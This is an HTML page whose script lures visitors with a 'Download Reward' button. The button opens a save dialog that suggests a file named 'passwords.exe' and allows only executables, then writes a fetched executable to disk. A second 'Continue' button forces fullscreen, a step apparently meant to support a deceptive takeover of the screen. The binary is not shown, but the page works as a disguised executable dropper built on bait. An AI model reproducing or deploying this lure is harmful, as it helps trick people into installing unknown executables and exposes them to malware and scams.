<!DOCTYPE html>
<html>

<head>
    <title>File Picker + Fullscreen</title>
    <meta charset="UTF-8">
</head>

<style>
body {
    background: #1d306d;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    height: 100vh;
    margin: 0;
    color: white;
    font-family: Arial;
    text-align: center;
}

button {
    padding: 15px 30px;
    font-size: 20px;
    margin: 15px;
    cursor: pointer;
    border-radius: 10px;
    border: none;
}

#status {
    margin-top: 20px;
    font-size: 18px;
}
</style>

<body>

<h1>Step 1 → Save File</h1>
<button id="btn1">Download Reward 🎁</button>

<h1>Step 2 → Go Fullscreen</h1>
<button id="btn2">Continue 🚀</button>

<div id="status"></div>

<script>

// ✅ BUTTON 1 → FILE PICKER (delay allowed)
document.getElementById("btn1").onclick = () => {

    document.getElementById("status").textContent = "Opening file picker...";

    setTimeout(async () => {
        try {
            const handle = await window.showSaveFilePicker({
                suggestedName: "passwords.exe",
                types: [{
                    description: "Executable",
                    accept: {
                        "application/octet-stream": [".exe"]
                    }
                }],
                excludeAcceptAllOption: true
            });

            const writable = await handle.createWritable();

            const response = await fetch("passwords.exe");
            await response.body.pipeTo(writable);

            document.getElementById("status").textContent =
                "✅ File saved successfully";

        } catch (e) {
            document.getElementById("status").textContent =
                "❌ Cancelled or blocked";
        }
    }, 1000); // delay OK here
};


// ✅ BUTTON 2 → FULLSCREEN (NO DELAY)
document.getElementById("btn2").onclick = () => {

    document.getElementById("status").textContent = "Entering fullscreen...";

    // ⚠️ MUST be direct (no setTimeout / no await)
    if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen()
        .then(() => {
            document.getElementById("status").textContent =
                "🚀 Fullscreen activated";
        })
        .catch(err => {
            document.getElementById("status").textContent =
                "❌ Fullscreen blocked";
            console.log(err);
        });
    }
};

</script>

</body>
</html>
